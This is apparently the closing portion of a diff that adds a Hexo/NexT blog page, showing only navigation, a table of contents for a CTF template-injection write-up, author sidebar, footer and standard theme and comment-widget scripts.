+    <a href="/%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%BA%8C%E5%9C%BA.html" rel="prev" title="[XCTF]华为第二场">
+      <i class="fa fa-chevron-left"></i> [XCTF]华为第二场
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/CCPC%E8%A2%AB%E6%97%A5.html" rel="next" title="CCPC被日调查">
+      CCPC被日调查 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XCTF-%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%B8%89%E5%9C%BA"><span class="nav-number">1.</span> <span class="nav-text">[XCTF]华为第三场</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%8E%E4%B8%BAHCIE%E7%9A%84%E7%AC%AC%E4%B8%80%E8%AF%BE"><span class="nav-number">1.1.</span> <span class="nav-text">华为HCIE的第一课</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HBS%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95"><span class="nav-number">1.1.1.</span> <span class="nav-text">HBS模板语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">{{#with xxx}} {{&#x2F;with}} </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#-1"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">{{#each xxx}} {{&#x2F;each}} </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lookup"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">lookup</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#log"><span class="nav-number">1.1.1.4.</span> <span class="nav-text">log</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload1"><span class="nav-number">1.1.2.</span> <span class="nav-text">payload1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#payload1%E5%A4%B1%E8%B4%A5"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">payload1失败</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload2"><span class="nav-number">1.1.3.</span> <span class="nav-text">payload2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E8%A7%A3"><span class="nav-number">1.1.4.</span> <span class="nav-text">题解</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">145</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
